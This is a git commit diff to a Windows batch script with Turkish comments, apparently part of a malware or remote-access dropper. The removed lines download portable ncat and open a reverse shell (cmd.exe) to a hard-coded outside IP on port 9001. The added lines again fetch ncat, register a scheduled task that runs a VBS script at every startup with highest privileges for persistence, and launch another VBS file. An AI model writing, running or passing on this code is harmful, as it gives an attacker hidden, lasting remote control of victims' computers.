9127fc04431ef746aadceb4b8675b094d8a45a70
Seition2 <130700484+seition2doc@users.noreply.github.com>
2025-06-07 12:29:30 +0300

    Update asd123.bat

--- asd123.bat
+++ asd123.bat
@@ -1,4 +1,22 @@
-del /f /q "asd.bat"
-cd %temp%
-curl -L https://github.com/cyberisltd/NcatPortable/raw/refs/heads/master/ncat.exe -o ncat.exe
-ncat.exe 185.194.175.132 9001 -e cmd.exe
+@echo off
+setlocal
+
+REM Görevi kontrol et
+schtasks /query /tn "TempVBS_OnBoot" >nul 2>&1
+
+if %errorlevel% neq 0 (
+    REM Görev YOKSA
+    del /f /q "asd.bat"
+    cd /d %temp%
+    curl -L https://github.com/cyberisltd/NcatPortable/raw/refs/heads/master/ncat.exe -o ncat.exe
+    schtasks /create /tn "TempVBS_OnBoot" /tr "%temp%\e.vbs" /sc onstart /f /rl HIGHEST
+    start "" "%temp%\rb.vbs"
+) else (
+    REM Görev VARSA
+    del /f /q "asd.bat"
+    cd /d %temp%
+    curl -L https://github.com/cyberisltd/NcatPortable/raw/refs/heads/master/ncat.exe -o ncat.exe
+    schtasks /create /tn "TempVBS_OnBoot" /tr "%temp%\e.vbs" /sc onstart /f /rl HIGHEST
+)
+
+endlocal
